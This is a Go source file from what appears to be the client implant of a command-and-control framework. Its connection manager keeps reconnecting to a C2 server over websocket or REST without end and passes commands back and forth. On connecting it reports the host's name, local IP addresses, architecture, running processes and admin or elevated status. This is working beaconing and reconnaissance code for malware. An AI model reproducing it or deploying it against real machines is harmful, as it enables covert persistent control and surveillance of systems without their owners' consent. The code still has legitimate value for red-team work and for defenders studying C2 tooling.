package client

import (
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"

	log "github.com/sirupsen/logrus"
)

// Upstreammanger provides a connection to the server via ChannelIncoming
type UpstreamManager struct {
	ChannelIncoming chan model.Packet
	ChannelOutgoing chan model.Packet

	config   *ClientConfig
	campaign *campaign.Campaign

	Rest      Upstream
	Websocket Upstream

	reconnectTimer *SleepTimer
}

func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
	upstreamRest := MakeUpstreamRest(config, campaign)
	upstreamWs := MakeUpstreamWs(config, campaign)
	reconnectTimer := MakeSleepTimer()

	u := UpstreamManager{
		ChannelIncoming: make(chan model.Packet),
		ChannelOutgoing: make(chan model.Packet),
		config:          config,
		campaign:        campaign,
		Rest:            &upstreamRest,
		Websocket:       &upstreamWs,
		reconnectTimer:  &reconnectTimer,
	}
	return u
}

// Connect will try until the C2 can be reached via a upstream.
func (u *UpstreamManager) Connect() {
	// Thread which retrieves packets from the active upstream and sends it to client
	var packet model.Packet
	var connected bool
	go func() {
		for {
			// We dont care which upstream we are connected to
			select {
			case packet, connected = <-u.Websocket.ChanIncoming():
				if !connected {
					u.ReconnectWebsocket() // Blocks until we can reach server again
					continue               // We are connected again, do as before
				}
			case packet, connected = <-u.Rest.ChanIncoming():
				// No reconnect handling atm
			}

			// Send the packet to client
			u.ChannelIncoming <- packet
		}
	}()

	// Thread which sends outgoing packets
	go func() {
		for {
			packet, ok := <-u.ChannelOutgoing
			if !ok {
				break
			}

			if u.Websocket.Connected() {
				u.Websocket.ChanOutgoing() <- packet
				//break
			} else if u.Rest.Connected() {
				u.Rest.ChanOutgoing() <- packet
				//break
			} else {
				log.Errorf("UpstreamManager: No active upstreams, drop packet and sleep")
				time.Sleep(time.Second * 3)
			}
		}
	}()

	u.ConnectRetryForever()
}

// ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
func (u *UpstreamManager) ConnectRetryForever() error {
	u.reconnectTimer.tick()
	for {
		if u.campaign.ClientUseWebsocket {
			// Try: Websocket
			err := u.Websocket.Connect()
			if err != nil {
				log.Debugf("UpstreamManager: Trying to connect to upstraem websocket resulted in: %s", err.Error())
			} else {
				log.Infof("UpstreamManager: Connected to websocket")
				u.Websocket.Start()
				u.sendClientinfo()
				break
			}
		} else {
			err := u.Rest.Connect()
			if err != nil {
				log.Debugf("UpstreamManager: Trying to connect to upstream REST resulted in: %s", err.Error())
			} else {
				log.Infof("UpstreamManager: Connected to REST")
				u.Rest.Start()
				u.sendClientinfo()
				break
			}
		}

		log.Debug("UpstreamManager: Could not connect, sleeping...")
		time.Sleep(u.reconnectTimer.getSleepDuration())
	}

	return nil
}

// Reconnect will destroy the currect WS upstream, and block until connected again
func (u *UpstreamManager) ReconnectWebsocket() {
	// Throw away old UpstreamWs, and try to connect again
	upstreamWs := MakeUpstreamWs(u.config, u.campaign)
	u.Websocket = &upstreamWs
	log.Infof("UpstreamManager: Upstream websocket disconnect. Retrying...")
	u.ConnectRetryForever()
}

// sendClientinfo will send client information (like process list) to the server
func (u *UpstreamManager) sendClientinfo() {
	if !u.campaign.DoClientInfo {
		return
	}

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	response["hostname"] = u.config.Hostname
	model.AddArrayToResponse("localIp", u.config.LocalIps, response)
	response["arch"] = u.config.Arch
	model.AddArrayToResponse("processes", u.config.Processes, response)
	isElevated, isAdmin, err := arch.Permissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}

	packet := u.config.MakeClientPacket("clientinfo", arguments, response)
	u.ChannelOutgoing <- *packet
}
